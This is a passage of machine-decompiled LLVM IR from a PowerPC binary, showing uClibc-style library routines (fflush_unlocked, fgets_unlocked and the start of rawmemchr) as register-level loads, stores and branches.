  %v3_10012d0c = load i16*, i16** @global_var_1002b934.833, align 4
  %v2_10012d10 = icmp sgt i16* %v3_10012d0c, null
  br i1 %v2_10012d10, label %dec_label_pc_10012d18, label %dec_label_pc_10012db0

dec_label_pc_10012d18:                            ; preds = %dec_label_pc_10012d08
  %v2_10012d24 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10012d24, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_10012d30 = call i32 @__pthread_return_void()
  %v0_10012d38 = call i32 @__pthread_return_0()
  %storemerge7 = load i32, i32* bitcast (i32** @global_var_1002b8e0.714 to i32*), align 4
  store i32 %storemerge7, i32* @r29, align 4
  %v3_10012d9010 = icmp eq i32 %storemerge7, 0
  %v0_10012d9411 = load i32, i32* @r30, align 4
  br i1 %v3_10012d9010, label %dec_label_pc_10012d9c, label %dec_label_pc_10012d48

dec_label_pc_10012d48:                            ; preds = %dec_label_pc_10012d18, %dec_label_pc_10012d90.backedge
  %v0_10012d9416 = phi i32 [ %v0_10012d94, %dec_label_pc_10012d90.backedge ], [ %v0_10012d9411, %dec_label_pc_10012d18 ]
  %v3_10012d9417.in = phi i32 [ %v0_10012d94, %dec_label_pc_10012d90.backedge ], [ %v0_10012d9411, %dec_label_pc_10012d18 ]
  %storemerge15 = phi i32 [ %storemerge, %dec_label_pc_10012d90.backedge ], [ %storemerge7, %dec_label_pc_10012d18 ]
  %v1_10012d48 = inttoptr i32 %storemerge15 to i16*
  %v2_10012d48 = load i16, i16* %v1_10012d48, align 2
  %v1_10012d4c = add i32 %storemerge15, 32
  %v2_10012d4c = inttoptr i32 %v1_10012d4c to i32*
  %v3_10012d4c = load i32, i32* %v2_10012d4c, align 4
  store i32 %v3_10012d4c, i32* @r31, align 4
  %v1_10012d50 = and i16 %v2_10012d48, -32720
  %v3_10012d54 = icmp eq i16 %v1_10012d50, 48
  br i1 %v3_10012d54, label %dec_label_pc_10012d64, label %dec_label_pc_10012d5c

dec_label_pc_10012d5c:                            ; preds = %dec_label_pc_10012d48
  store i32 %storemerge15, i32* @r30, align 4
  br label %dec_label_pc_10012d90.backedge

dec_label_pc_10012d64:                            ; preds = %dec_label_pc_10012d48
  %v3_10012d9417 = icmp eq i32 %v3_10012d9417.in, 0
  br i1 %v3_10012d9417, label %dec_label_pc_10012d68, label %dec_label_pc_10012d74

dec_label_pc_10012d68:                            ; preds = %dec_label_pc_10012d64
  store i32 %v3_10012d4c, i32* bitcast (i32** @global_var_1002b8e0.714 to i32*), align 4
  br label %dec_label_pc_10012d78

dec_label_pc_10012d74:                            ; preds = %dec_label_pc_10012d64
  %v2_10012d74 = add i32 %v0_10012d9416, 32
  %v3_10012d74 = inttoptr i32 %v2_10012d74 to i32*
  store i32 %v3_10012d4c, i32* %v3_10012d74, align 4
  %v0_10012d78.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10012d78

dec_label_pc_10012d78:                            ; preds = %dec_label_pc_10012d68, %dec_label_pc_10012d74
  %v0_10012d78 = phi i32 [ %storemerge15, %dec_label_pc_10012d68 ], [ %v0_10012d78.pre, %dec_label_pc_10012d74 ]
  %v1_10012d78 = inttoptr i32 %v0_10012d78 to i16*
  %v2_10012d78 = load i16, i16* %v1_10012d78, align 2
  %v1_10012d80 = and i16 %v2_10012d78, 8192
  %v3_10012d80 = icmp eq i16 %v1_10012d80, 0
  br i1 %v3_10012d80, label %dec_label_pc_10012d90.backedge, label %dec_label_pc_10012d88

dec_label_pc_10012d90.backedge:                   ; preds = %dec_label_pc_10012d78, %dec_label_pc_10012d5c, %dec_label_pc_10012d88
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_10012d90 = icmp eq i32 %storemerge, 0
  %v0_10012d94 = load i32, i32* @r30, align 4
  br i1 %v3_10012d90, label %dec_label_pc_10012d9c, label %dec_label_pc_10012d48

dec_label_pc_10012d88:                            ; preds = %dec_label_pc_10012d78
  store i32 268512652, i32* @lr, align 4
  %v2_10012d88 = call i32 @free(i32 %v0_10012d78)
  br label %dec_label_pc_10012d90.backedge

dec_label_pc_10012d9c:                            ; preds = %dec_label_pc_10012d90.backedge, %dec_label_pc_10012d18
  store i32 %v2_10012d24, i32* @r3, align 4
  %v0_10012da4 = call i32 @__pthread_return_void()
  %v0_10012dac = load i32, i32* @r29, align 4
  %v4_10012dac = inttoptr i32 %v0_10012dac to i16*
  store i16* %v4_10012dac, i16** @global_var_1002b934.833, align 4
  %v3_10012db8.pre = load i32, i32* @global_var_1002b930.832, align 4
  br label %dec_label_pc_10012db0

dec_label_pc_10012db0:                            ; preds = %dec_label_pc_10012d08, %entry, %dec_label_pc_10012d9c
  %v3_10012db8 = phi i32 [ 1, %dec_label_pc_10012d08 ], [ %v3_10012cfc, %entry ], [ %v3_10012db8.pre, %dec_label_pc_10012d9c ]
  store i32 %v2_10012ce4, i32* @r3, align 4
  %v1_10012dc0 = add i32 %v3_10012db8, -1
  store i32 %v1_10012dc0, i32* @global_var_1002b930.832, align 4
  %v0_10012dc8 = call i32 @__pthread_return_void()
  ret i32 %v0_10012dc8

; uselistorder directives
  uselistorder i32 %v0_10012d94, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10012d78, { 1, 0 }
  uselistorder i32 %v3_10012d4c, { 1, 0, 2 }
  uselistorder i32 %storemerge15, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 16, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 20, 17, 19, 18, 15 }
  uselistorder i16** @global_var_1002b934.833, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10012db0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012d90.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012d78, { 1, 0 }
  uselistorder label %dec_label_pc_10012d48, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_1002b8e0.714 to i32), i32* %r9.global-to-local, align 4
  %v5_10012df0 = icmp eq i16* %arg1, bitcast (i32** @global_var_1002b8e0.714 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_10012df0, label %dec_label_pc_10012e14, label %dec_label_pc_10012e08

dec_label_pc_10012e08:                            ; preds = %entry
  %v4_10012e08 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_10012e08, label %dec_label_pc_10012e14, label %dec_label_pc_10012f40

dec_label_pc_10012e14:                            ; preds = %dec_label_pc_10012e08, %entry
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10010048.752 to i32), i32* @r30, align 4
  %v2_10012e20 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10012e20, i32* @r3, align 4
  %v0_10012e34 = call i32 @__pthread_return_void()
  %v0_10012e3c = call i32 @__pthread_return_0()
  %v3_10012e44 = load i32, i32* @global_var_1002b930.832, align 4
  store i32 %v2_10012e20, i32* @r3, align 4
  %v1_10012e54 = add i32 %v3_10012e44, 1
  store i32 %v1_10012e54, i32* %r9.global-to-local, align 4
  store i32 %v1_10012e54, i32* @global_var_1002b930.832, align 4
  %v0_10012e60 = call i32 @__pthread_return_void()
  store i32 %v2_10012e20, i32* @r3, align 4
  %v0_10012e70 = call i32 @__pthread_return_void()
  %v0_10012e78 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %v2_10012e20, i32* @r3, align 4
  %v3_10012e84 = load i32, i32* bitcast (i32** @global_var_1002b8e0.714 to i32*), align 4
  store i32 %v3_10012e84, i32* @r31, align 4
  store i32 0, i32* @r28, align 4
  %v0_10012e90 = call i32 @__pthread_return_void()
  %v0_10012f30.pr = load i32, i32* @r31, align 4
  %v3_10012f303 = icmp eq i32 %v0_10012f30.pr, 0
  br i1 %v3_10012f303, label %dec_label_pc_10012f38, label %dec_label_pc_10012e98

dec_label_pc_10012e98:                            ; preds = %dec_label_pc_10012e14, %dec_label_pc_10012f2c
  %v0_10012eb4 = phi i32 [ %v3_10012f2c, %dec_label_pc_10012f2c ], [ %v0_10012f30.pr, %dec_label_pc_10012e14 ]
  %v1_10012e98 = inttoptr i32 %v0_10012eb4 to i16*
  %v2_10012e98 = load i16, i16* %v1_10012e98, align 2
  %v3_10012e98 = zext i16 %v2_10012e98 to i32
  %v1_10012e9c = and i32 %v3_10012e98, 64
  store i32 %v1_10012e9c, i32* %r9.global-to-local, align 4
  %v3_10012e9c = icmp eq i32 %v1_10012e9c, 0
  br i1 %v3_10012e9c, label %dec_label_pc_10012f2c, label %dec_label_pc_10012ea4

dec_label_pc_10012ea4:                            ; preds = %dec_label_pc_10012e98
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10012ea8 = load i32, i32* @global_var_1002b8e4.837, align 4
  %v3_10012eac = icmp eq i32 %v3_10012ea8, 2
  br i1 %v3_10012eac, label %dec_label_pc_10012ed0, label %dec_label_pc_10012eb4

dec_label_pc_10012eb4:                            ; preds = %dec_label_pc_10012ea4
  store i32 %v2_10012e20, i32* @r3, align 4
  %v0_10012ec4 = call i32 @__pthread_return_void()
  %v0_10012ecc = call i32 @__pthread_return_0()
  %v0_10012ed0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012ed0

dec_label_pc_10012ed0:                            ; preds = %dec_label_pc_10012ea4, %dec_label_pc_10012eb4
  %v0_10012ee4 = phi i32 [ %v0_10012eb4, %dec_label_pc_10012ea4 ], [ %v0_10012ed0.pre, %dec_label_pc_10012eb4 ]
  %v1_10012ed0 = inttoptr i32 %v0_10012ee4 to i16*
  %v2_10012ed0 = load i16, i16* %v1_10012ed0, align 2
  %v3_10012ed0 = zext i16 %v2_10012ed0 to i32
  %v0_10012ed4 = load i32, i32* @r27, align 4
  %v2_10012ed4 = or i32 %v0_10012ed4, %v3_10012ed0
  %v1_10012ed8 = and i32 %v2_10012ed4, 832
  %v1_10012edc = xor i32 %v1_10012ed8, 320
  store i32 %v1_10012edc, i32* %r9.global-to-local, align 4
  %v3_10012edc = icmp eq i32 %v1_10012edc, 0
  br i1 %v3_10012edc, label %dec_label_pc_10012ee4, label %dec_label_pc_10012f10

dec_label_pc_10012ee4:                            ; preds = %dec_label_pc_10012ed0
  store i32 %v0_10012ee4, i32* @r3, align 4
  store i32 268513004, i32* @lr, align 4
  %v0_10012ee8 = call i32 @__stdio_wcommit()
  %v3_10012eec = icmp eq i32 %v0_10012ee8, 0
  br i1 %v3_10012eec, label %dec_label_pc_10012efc, label %dec_label_pc_10012ef4

dec_label_pc_10012ef4:                            ; preds = %dec_label_pc_10012ee4
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10012f10

dec_label_pc_10012efc:                            ; preds = %dec_label_pc_10012ee4
  %v0_10012efc = load i32, i32* @r31, align 4
  %v1_10012efc = inttoptr i32 %v0_10012efc to i16*
  %v2_10012efc = load i16, i16* %v1_10012efc, align 2
  %v3_10012efc = zext i16 %v2_10012efc to i32
  %v1_10012f00 = add i32 %v0_10012efc, 8
  %v2_10012f00 = inttoptr i32 %v1_10012f00 to i32*
  %v3_10012f00 = load i32, i32* %v2_10012f00, align 4
  store i32 %v3_10012f00, i32* %r9.global-to-local, align 4
  %v1_10012f04 = call i32 @__asm_rlwinm(i32 %v3_10012efc, i32 0, i32 26, i32 24)
  %v2_10012f04 = trunc i32 %v1_10012f04 to i16
  %v1_10012f08 = load i32, i32* @r31, align 4
  %v2_10012f08 = add i32 %v1_10012f08, 28
  %v3_10012f08 = inttoptr i32 %v2_10012f08 to i32*
  store i32 %v3_10012f00, i32* %v3_10012f08, align 4
  %v3_10012f0c = load i32, i32* @r31, align 4
  %v4_10012f0c = inttoptr i32 %v3_10012f0c to i16*
  store i16 %v2_10012f04, i16* %v4_10012f0c, align 2
  br label %dec_label_pc_10012f10

dec_label_pc_10012f10:                            ; preds = %dec_label_pc_10012ed0, %dec_label_pc_10012ef4, %dec_label_pc_10012efc
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10012f14 = load i32, i32* @global_var_1002b8e4.837, align 4
  %v3_10012f18 = icmp eq i32 %v3_10012f14, 2
  br i1 %v3_10012f18, label %dec_label_pc_10012f2c, label %dec_label_pc_10012f20

dec_label_pc_10012f20:                            ; preds = %dec_label_pc_10012f10
  store i32 %v2_10012e20, i32* @r3, align 4
  %v0_10012f28 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10012f2c

dec_label_pc_10012f2c:                            ; preds = %dec_label_pc_10012f10, %dec_label_pc_10012e98, %dec_label_pc_10012f20
  %v0_10012f2c = load i32, i32* @r31, align 4
  %v1_10012f2c = add i32 %v0_10012f2c, 32
  %v2_10012f2c = inttoptr i32 %v1_10012f2c to i32*
  %v3_10012f2c = load i32, i32* %v2_10012f2c, align 4
  store i32 %v3_10012f2c, i32* @r31, align 4
  %v3_10012f30 = icmp eq i32 %v3_10012f2c, 0
  br i1 %v3_10012f30, label %dec_label_pc_10012f38, label %dec_label_pc_10012e98

dec_label_pc_10012f38:                            ; preds = %dec_label_pc_10012f2c, %dec_label_pc_10012e14
  store i32 ptrtoint (i32* @global_var_10012f3c.840 to i32), i32* @lr, align 4
  %v0_10012f38 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_10012f78

dec_label_pc_10012f40:                            ; preds = %dec_label_pc_10012e08
  %v3_10012f40 = load i16, i16* %arg1, align 2
  %v4_10012f40 = zext i16 %v3_10012f40 to i32
  store i32 0, i32* @r28, align 4
  %v1_10012f48 = and i32 %v4_10012f40, 64
  store i32 %v1_10012f48, i32* %r9.global-to-local, align 4
  %v3_10012f48 = icmp eq i32 %v1_10012f48, 0
  br i1 %v3_10012f48, label %dec_label_pc_10012f78, label %dec_label_pc_10012f50

dec_label_pc_10012f50:                            ; preds = %dec_label_pc_10012f40
  store i32 268513108, i32* @lr, align 4
  %v0_10012f50 = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_10012f58 = icmp eq i32 %v0_10012f50, 0
  br i1 %v3_10012f58, label %dec_label_pc_10012f60, label %dec_label_pc_10012f78

dec_label_pc_10012f60:                            ; preds = %dec_label_pc_10012f50
  %v0_10012f60 = load i32, i32* @r29, align 4
  %v1_10012f60 = inttoptr i32 %v0_10012f60 to i16*
  %v2_10012f60 = load i16, i16* %v1_10012f60, align 2
  %v3_10012f60 = zext i16 %v2_10012f60 to i32
  store i32 0, i32* @r28, align 4
  %v1_10012f68 = add i32 %v0_10012f60, 8
  %v2_10012f68 = inttoptr i32 %v1_10012f68 to i32*
  %v3_10012f68 = load i32, i32* %v2_10012f68, align 4
  store i32 %v3_10012f68, i32* %r9.global-to-local, align 4
  %v1_10012f6c = call i32 @__asm_rlwinm(i32 %v3_10012f60, i32 0, i32 26, i32 24)
  %v2_10012f6c = trunc i32 %v1_10012f6c to i16
  %v3_10012f70 = load i32, i32* @r29, align 4
  %v4_10012f70 = inttoptr i32 %v3_10012f70 to i16*
  store i16 %v2_10012f6c, i16* %v4_10012f70, align 2
  %v0_10012f74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012f74 = load i32, i32* @r29, align 4
  %v2_10012f74 = add i32 %v1_10012f74, 28
  %v3_10012f74 = inttoptr i32 %v2_10012f74 to i32*
  store i32 %v0_10012f74, i32* %v3_10012f74, align 4
  br label %dec_label_pc_10012f78

dec_label_pc_10012f78:                            ; preds = %dec_label_pc_10012f50, %dec_label_pc_10012f40, %dec_label_pc_10012f38, %dec_label_pc_10012f60
  %v0_10012f7c = load i32, i32* @r28, align 4
  ret i32 %v0_10012f7c

; uselistorder directives
  uselistorder i32 %v3_10012f2c, { 1, 2, 0 }
  uselistorder i32 %v1_10012edc, { 1, 0 }
  uselistorder i32 %v2_10012e20, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1002b8e0.714 to i32*), { 3, 4, 0, 5, 6, 1, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10030000.1 to i32), { 18, 19, 20, 21, 22, 23, 24, 25, 0, 26, 27, 10, 1, 28, 3, 2, 11, 4, 12, 29, 13, 30, 5, 14, 31, 32, 33, 34, 35, 15, 16, 6, 7, 8, 17, 9 }
  uselistorder i32* @global_var_1002b930.832, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__pthread_return_0, { 33, 32, 31, 30, 29, 28, 7, 6, 35, 27, 26, 25, 5, 4, 3, 24, 23, 22, 21, 20, 19, 34, 0, 37, 39, 38, 36, 12, 11, 10, 9, 8, 18, 17, 16, 15, 14, 13, 2, 1 }
  uselistorder i32 ()* @__pthread_return_void, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 5, 4, 41, 40, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 39, 38, 1, 0, 45, 44, 49, 48, 47, 46, 43, 42, 3, 2 }
  uselistorder i32 268500992, { 5, 0, 1, 2, 3, 4 }
  uselistorder i16* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10012f78, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10012f2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012f10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012ed0, { 1, 0 }
  uselistorder label %dec_label_pc_10012e98, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_10013038, label %dec_label_pc_10012fb0

dec_label_pc_10012fb0:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_100130183 = add i32 %arg2, -1
  store i32 %v2_100130183, i32* @r29, align 4
  %v4_100130209 = icmp eq i32 %arg2, 1
  br i1 %v4_100130209, label %dec_label_pc_10013024, label %dec_label_pc_10012fb8

dec_label_pc_10012fb8:                            ; preds = %dec_label_pc_10012fb0, %dec_label_pc_10013018.backedge
  %v2_10012fd4 = phi i32 [ %v2_10012fd412, %dec_label_pc_10013018.backedge ], [ %tmp, %dec_label_pc_10012fb0 ]
  %v0_10012fb8 = phi i32 [ %v0_1001301c, %dec_label_pc_10013018.backedge ], [ %arg3, %dec_label_pc_10012fb0 ]
  %v1_10012fb8 = add i32 %v0_10012fb8, 16
  %v2_10012fb8 = inttoptr i32 %v1_10012fb8 to i32*
  %v3_10012fb8 = load i32, i32* %v2_10012fb8, align 4
  %v1_10012fbc = add i32 %v0_10012fb8, 24
  %v2_10012fbc = inttoptr i32 %v1_10012fbc to i32*
  %v3_10012fbc = load i32, i32* %v2_10012fbc, align 4
  %v2_10012fc0 = add i32 %v3_10012fb8, 1
  store i32 %v2_10012fc0, i32* %r11.global-to-local, align 4
  %v3_10012fc4 = icmp ult i32 %v3_10012fb8, %v3_10012fbc
  %v5_10012fc4 = icmp eq i32 %v3_10012fb8, %v3_10012fbc
  store i1 %v5_10012fc4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012fc4, label %dec_label_pc_10012fcc, label %dec_label_pc_10012fe8

dec_label_pc_10012fcc:                            ; preds = %dec_label_pc_10012fb8
  %v4_10012fb8 = inttoptr i32 %v3_10012fb8 to i8*
  %v3_10012fcc = load i8, i8* %v4_10012fb8, align 1
  %v3_10012fd0 = icmp eq i8 %v3_10012fcc, 10
  store i1 %v3_10012fd0, i1* %cr7_eq.global-to-local, align 1
  %v3_10012fd4 = inttoptr i32 %v2_10012fd4 to i8*
  store i8 %v3_10012fcc, i8* %v3_10012fd4, align 1
  %v0_10012fd8 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012fd8 = load i32, i32* @r30, align 4
  %v2_10012fd8 = add i32 %v1_10012fd8, 16
  %v3_10012fd8 = inttoptr i32 %v2_10012fd8 to i32*
  store i32 %v0_10012fd8, i32* %v3_10012fd8, align 4
  %v0_10012fdc = load i32, i32* @r31, align 4
  %v1_10012fdc = add i32 %v0_10012fdc, 1
  store i32 %v1_10012fdc, i32* @r31, align 4
  %v0_10012fe0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10012fe0, label %dec_label_pc_10013024, label %dec_label_pc_10013018.backedge

dec_label_pc_10012fe8:                            ; preds = %dec_label_pc_10012fb8
  %v1_1001301c10 = inttoptr i32 %v0_10012fb8 to i16*
  store i32 268513260, i32* @lr, align 4
  %v5_10012fe8 = call i32 @getc_unlocked(i16* %v1_1001301c10, i32 %v3_10012fb8)
  %v6_10012fe8 = trunc i32 %v5_10012fe8 to i8
  %v4_10012fec = icmp eq i8 %v6_10012fe8, -1
  store i1 %v4_10012fec, i1* %cr7_eq.global-to-local, align 1
  %v3_10012ff4 = icmp eq i8 %v6_10012fe8, 10
  store i1 %v3_10012ff4, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10012fec, label %dec_label_pc_10012ffc, label %dec_label_pc_1001300c

dec_label_pc_10012ffc:                            ; preds = %dec_label_pc_10012fe8
  %v0_10012ffc = load i32, i32* @r30, align 4
  %v1_10012ffc = inttoptr i32 %v0_10012ffc to i16*
  %v2_10012ffc = load i16, i16* %v1_10012ffc, align 2
  %v1_10013000 = and i16 %v2_10012ffc, 8
  %v3_10013000 = icmp eq i16 %v1_10013000, 0
  br i1 %v3_10013000, label %dec_label_pc_10012ffc.dec_label_pc_10013024_crit_edge, label %dec_label_pc_10013038

dec_label_pc_10012ffc.dec_label_pc_10013024_crit_edge: ; preds = %dec_label_pc_10012ffc
  %v0_10013024.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013024

dec_label_pc_1001300c:                            ; preds = %dec_label_pc_10012fe8
  %v3_1001300c = load i32, i32* @r31, align 4
  %v4_1001300c = inttoptr i32 %v3_1001300c to i8*
  store i8 %v6_10012fe8, i8* %v4_1001300c, align 1
  %v0_10013010 = load i32, i32* @r31, align 4
  %v1_10013010 = add i32 %v0_10013010, 1
  store i32 %v1_10013010, i32* @r31, align 4
  %v0_10013014 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10013014, label %dec_label_pc_10013024, label %dec_label_pc_10013018.backedge

dec_label_pc_10013018.backedge:                   ; preds = %dec_label_pc_1001300c, %dec_label_pc_10012fcc
  %v2_10012fd412 = phi i32 [ %v1_10013010, %dec_label_pc_1001300c ], [ %v1_10012fdc, %dec_label_pc_10012fcc ]
  %v0_10013018 = load i32, i32* @r29, align 4
  %v2_10013018 = add i32 %v0_10013018, -1
  store i32 %v2_10013018, i32* @r29, align 4
  %v0_1001301c = load i32, i32* @r30, align 4
  %v4_10013020 = icmp eq i32 %v0_10013018, 1
  br i1 %v4_10013020, label %dec_label_pc_10013024, label %dec_label_pc_10012fb8

dec_label_pc_10013024:                            ; preds = %dec_label_pc_1001300c, %dec_label_pc_10013018.backedge, %dec_label_pc_10012fcc, %dec_label_pc_10012fb0, %dec_label_pc_10012ffc.dec_label_pc_10013024_crit_edge
  %v2_10013030 = phi i32 [ %v0_10013024.pre, %dec_label_pc_10012ffc.dec_label_pc_10013024_crit_edge ], [ %tmp, %dec_label_pc_10012fb0 ], [ %v1_10012fdc, %dec_label_pc_10012fcc ], [ %v2_10012fd412, %dec_label_pc_10013018.backedge ], [ %v1_10013010, %dec_label_pc_1001300c ]
  %v1_10013024 = load i32, i32* @r28, align 4
  %v3_10013024 = icmp ugt i32 %v2_10013030, %v1_10013024
  %v4_10013024 = icmp eq i32 %v2_10013030, %v1_10013024
  store i1 %v4_10013024, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013024, label %dec_label_pc_1001302c, label %dec_label_pc_10013038

dec_label_pc_1001302c:                            ; preds = %dec_label_pc_10013024
  %v3_10013030 = inttoptr i32 %v2_10013030 to i8*
  store i8 0, i8* %v3_10013030, align 1
  %v0_10013040.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001303c

dec_label_pc_10013038:                            ; preds = %dec_label_pc_10012ffc, %dec_label_pc_10013024, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1001303c

dec_label_pc_1001303c:                            ; preds = %dec_label_pc_1001302c, %dec_label_pc_10013038
  %v0_10013040 = phi i32 [ %v0_10013040.pre, %dec_label_pc_1001302c ], [ 0, %dec_label_pc_10013038 ]
  ret i32 %v0_10013040

; uselistorder directives
  uselistorder i32 %v2_10013030, { 0, 2, 1 }
  uselistorder i8 %v6_10012fe8, { 1, 0, 2 }
  uselistorder i32 %v3_10012fbc, { 1, 0 }
  uselistorder i32 %v3_10012fb8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_10012fb8, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 10, { 2, 3, 0, 1, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1001303c, { 1, 0 }
  uselistorder label %dec_label_pc_10013038, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013024, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10012fb8, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_10013054 = urem i32 %arg1, 256
  store i32 %v1_10013054, i32* %r4.global-to-local, align 4
  %v0_1001306c1 = load i32, i32* @r3, align 4
  %v1_1001306c2 = urem i32 %v0_1001306c1, 4
  %v3_1001306c4 = icmp eq i32 %v1_1001306c2, 0
  br i1 %v3_1001306c4, label %dec_label_pc_10013074, label %dec_label_pc_1001305c

dec_label_pc_1001305c:                            ; preds = %entry, %dec_label_pc_1001305c
  %v1_10013060 = phi i32 [ %v0_10013074.pre, %dec_label_pc_1001305c ], [ %v1_10013054, %entry ]
  %v0_1001305c = phi i32 [ %v1_10013068, %dec_label_pc_1001305c ], [ %v0_1001306c1, %entry ]
  %v1_1001305c = inttoptr i32 %v0_1001305c to i8*
  %v2_1001305c = load i8, i8* %v1_1001305c, align 1
  %v3_1001305c = zext i8 %v2_1001305c to i32
  %v4_10013060 = icmp eq i32 %v3_1001305c, %v1_10013060
  %v0_10013064 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10013060, i32 %v0_10013064)
  %v0_10013068 = load i32, i32* @r3, align 4
  %v1_10013068 = add i32 %v0_10013068, 1
  store i32 %v1_10013068, i32* @r3, align 4
  %v1_1001306c = urem i32 %v1_10013068, 4
  %v3_1001306c = icmp eq i32 %v1_1001306c, 0
  %v0_10013074.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1001306c, label %dec_label_pc_10013074, label %dec_label_pc_1001305c

dec_label_pc_10013074:                            ; preds = %dec_label_pc_1001305c, %entry
  %v0_1001308c9 = phi i32 [ %v0_1001306c1, %entry ], [ %v1_10013068, %dec_label_pc_1001305c ]
  %v0_10013074 = phi i32 [ %v1_10013054, %entry ], [ %v0_10013074.pre, %dec_label_pc_1001305c ]
  %v1_10013074 = mul i32 %v0_10013074, 256
  %v2_1001307c = or i32 %v1_10013074, %v0_10013074
  %v1_10013084 = mul i32 %v2_1001307c, 65536
  %v2_10013088 = or i32 %v1_10013084, %v2_1001307c
  br label %dec_label_pc_1001308c

dec_label_pc_1001308c:                            ; preds = %dec_label_pc_100130f8, %dec_label_pc_1001308c, %dec_label_pc_10013074
  %v0_100130c8 = phi i32 [ %v0_1001308c9, %dec_label_pc_10013074 ], [ %v1_10013090, %dec_label_pc_1001308c ], [ %v1_10013090, %dec_label_pc_100130f8 ]
  %v1_1001308c = inttoptr i32 %v0_100130c8 to i32*
  %v2_1001308c = load i32, i32* %v1_1001308c, align 4
  %v1_10013090 = add i32 %v0_100130c8, 4
  %v1_10013094 = add i32 %v0_100130c8, 2
  %v2_10013098 = xor i32 %v2_1001308c, %v2_10013088
  %v1_100130a0 = add i32 %v2_10013098, 2130640639
  %v2_100130a4 = xor i32 %v1_100130a0, %v2_10013098
  %v1_100130a8 = add i32 %v0_100130c8, 1
  %v2_100130ac = and i32 %v2_100130a4, -2130640640
  %v6_100130ac = icmp eq i32 %v2_100130ac, -2130640640
  br i1 %v6_100130ac, label %dec_label_pc_1001308c, label %dec_label_pc_100130b8

dec_label_pc_100130b8:                            ; preds = %dec_label_pc_1001308c
  %v2_100130b8 = inttoptr i32 %v0_100130c8 to i8*
  %v3_100130b8 = load i8, i8* %v2_100130b8, align 1
  %v4_100130b8 = zext i8 %v3_100130b8 to i32
  %v1_100130bc = add i32 %v0_100130c8, 3
  %v4_100130c0 = icmp eq i32 %v4_100130b8, %v0_10013074
